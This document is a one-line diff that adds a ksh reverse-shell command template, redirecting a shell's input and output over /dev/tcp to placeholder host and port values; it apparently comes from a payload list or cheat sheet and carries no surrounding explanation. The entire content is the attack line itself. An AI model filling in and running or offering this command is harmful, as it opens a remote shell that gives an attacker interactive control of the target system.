@@ -1,0 +1,1 @@
+ksh -c '*\shell* > /dev/tcp/*\host*/*\port* 2>&1 0>&1'
